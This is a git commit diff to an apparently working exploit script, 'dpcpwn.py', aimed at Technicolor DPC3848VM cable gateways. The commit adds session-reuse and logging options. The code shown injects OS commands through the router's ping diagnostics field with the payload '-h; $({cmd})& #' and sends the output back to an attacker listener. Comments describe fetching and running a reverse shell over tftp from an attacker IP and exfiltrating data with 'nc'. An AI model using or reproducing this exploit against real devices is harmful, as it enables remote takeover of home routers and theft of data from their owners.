b70c937854943a75a4257644b9b3b4ab7527f1e6
Shaun Ostoic <ostoic@uwindsor.ca>
2021-12-18 00:15:10 -0500

    --session for existing PHPSESSID usage, --quiet for direct output, QoL improvements

--- dpcpwn.py
+++ dpcpwn.py
@@ -14,8 +14,11 @@
 # tftp -g -r <rshell> <attacker_ip> && chmod +x <rshell> && ./<rshell>
 
 # Tested on: model="Technicolor DPC3848VM DOCSIS 3.0 Gateway" firmware="dpc3800-v303r2042162-160620a.p7b"
+# Tested on: model="Technicolor DPC3848VM DOCSIS 3.0 Gateway" firmware="dpc3800-v303r204318-210209a.p7b"
 
 import argparse
+from typing import Union
+
 import colorama
 import trio
 import asks
@@ -24,12 +27,12 @@ import re
 from loguru import logger
 from contextlib import asynccontextmanager
 
-logger.remove()
-logger.add(sys.stdout, colorize=True, format=f"[<level>{{level}}</level>]: {colorama.Style.BRIGHT}{{message}}{colorama.Style.NORMAL}")
-
 parser = argparse.ArgumentParser()
 parser.add_argument('target', type=str, help='The target to exploit')
 parser.add_argument('cmd', type=str, nargs=argparse.REMAINDER, help='A command to run on the target')
+parser.add_argument('--session', type=str, required=False, help='The php session id')
+parser.add_argument('--quiet', action='store_true', required=False, help='Only print error info and command output')
+parser.add_argument('--verbose', action='store_true', required=False, help='Print debug info')
 parser.add_argument('--lhost', type=str, required=True, help='The local hostname to connect back to')
 parser.add_argument('--rport', type=int, default=80, help='The target\'s router management http server port')
 parser.add_argument('--lport', type=int, default=4444, help='The local host\'s shell handler port')
@@ -38,6 +41,23 @@ parser.add_argument('--username', type=str, default='', help='The username to lo
 parser.add_argument('--password', type=str, default='',  help='The password to login to the router management page')
 args = parser.parse_args()
 
+logger.remove()
+
+LOG_LEVEL = 'INFO'
+if args.verbose:
+    LOG_LEVEL = 'DEBUG'
+
+if args.quiet:
+    LOG_LEVEL = 'ERROR'
+
+logger.add(
+    sys.stdout,
+    level=LOG_LEVEL,
+    colorize=True,
+    format=f"[<level>{{level}}</level>]: {colorama.Style.BRIGHT}{{message}}{colorama.Style.NORMAL}"
+)
+
+logger.debug('Verbose logging enabled')
 phpsessid_pattern = re.compile(f'PHPSESSID=([a-z0-9]+);')
 
 class DPC:
@@ -97,16 +117,12 @@ class DPC:
     def url(self):
         return f'http://{self.host}:{self.port}'
 
-    async def login(self, username='', password=''):
-        r = await self._session.post(f'{self.url}/check.php', data={
-            'username_login': username,
-            'password_login': password,
-            'LanguageSelect': 'en',
-            'login': 'Log In',
-        })
+    def set_session_id(self, session_id: str):
+        logger.debug(f'Loading session id: {session_id}')
+        self._session.headers['cookie'] = f'PHPSESSID={session_id}; err_cnt='
 
-        cookie = phpsessid_pattern.findall(r.headers['set-cookie'][0])[0]
-        self._session.headers['cookie'] = f'PHPSESSID={cookie}; err_cnt='
+    async def load_session_id(self, session_id: str):
+        self.set_session_id(session_id)
 
         # For some reason it doesn't consider our cookie valid unless we visit this (or any?) page first.
         r = await self._session.get(f'{self.url}/Administration.php')
@@ -115,21 +131,35 @@ class DPC:
 
         return r
 
+    async def login(self, username='', password=''):
+        r = await self._session.post(f'{self.url}/check.php', data={
+            'username_login': username,
+            'password_login': password,
+            'LanguageSelect': 'en',
+            'login': 'Log In',
+        })
+
+        logger.debug(f'response: {r=}')
+        session_id = phpsessid_pattern.findall(r.headers['set-cookie'][0])[0]
+        return await self.load_session_id(session_id)
+
     async def send_cmd(self, cmd: str):
-        # Simply force command execution using substitution: ping $(uname -a | nc ...)
+        # OS command injection using substitution: ping $(uname -a | nc ...)
         payload = f'-h; $({cmd})& #'
+        logger.debug(f'{payload=}')
         r = await self._session.get(f'{self.url}/actionHandler/checkLogin.php')
         if r.status_code != 200:
             raise PermissionError('GET /checkLogin.php failed')
 
-        r = await self._session.post(f'{self.url}/actionHandler/ajaxSet_Diagnostics.php.php', data={
-            'ping_ip_start': 'true',
-            'ping_dst': payload,
-            'ping_size': 56,
-            'ping_count': 1,
-            'ping_timeout': 1,
-        })
+        r = await self._session.post(f'{self.url}/actionHandler/ajaxSet_Diagnostics.php.php', data=dict(
+            ping_ip_start='true',
+            ping_dst=payload,
+            ping_size=56,
+            ping_count=1,
+            ping_timeout=1,
+        ))
 
+        logger.debug(f'command response: {r=}')
         if r.status_code == 401:
             raise PermissionError('Not authenticated')
 
@@ -141,7 +171,7 @@ class DPC:
 
         self.nursery.cancel_scope.cancel()
         if not self._output_received.is_set():
-            return None
+            raise TimeoutError('Timeout while waiting for command output')
 
         return self._last_output
 
@@ -149,11 +179,17 @@ class DPC:
         return await self._session.get(f'{self.url}/logout.php')
 
 @asynccontextmanager
-async def open_dpc(host: str, port: int, username: str, password: str):
+async def open_dpc(host: str, port: int, username: str, password: str, session_id: Union[str, None] = None):
     async with trio.open_nursery() as n:
         router = DPC(host, port, n)
         try:
-            await router.login(username, password)
+            if session_id is None:
+                logger.info('Logging in')
+                await router.login(username, password)
+                logger.success('Logged in')
+            else:
+                router.set_session_id(session_id)
+                logger.info(f'Using session id {session_id}')
             yield router
 
         finally:
@@ -190,7 +226,8 @@ intro = fr'''
 '''
 
 async def run_exploit():
-    print(colorize_logo(intro))
+    if not args.quiet:
+        print(colorize_logo(intro))
 
     try:
         if not args.force:
@@ -204,9 +241,7 @@ async def run_exploit():
         if isinstance(args.cmd, list):
             args.cmd = ' '.join(args.cmd)
 
-        logger.info('Logging in')
-        async with open_dpc(args.target, args.rport, args.username, args.password) as router:
-            logger.success('Logged in')
+        async with open_dpc(args.target, args.rport, args.username, args.password, session_id=args.session) as router:
             logger.info(f'Sending "{args.cmd}" to DPC...')
             output = await router.exec(args.cmd, args.lhost, args.lport)
             if output is not None:
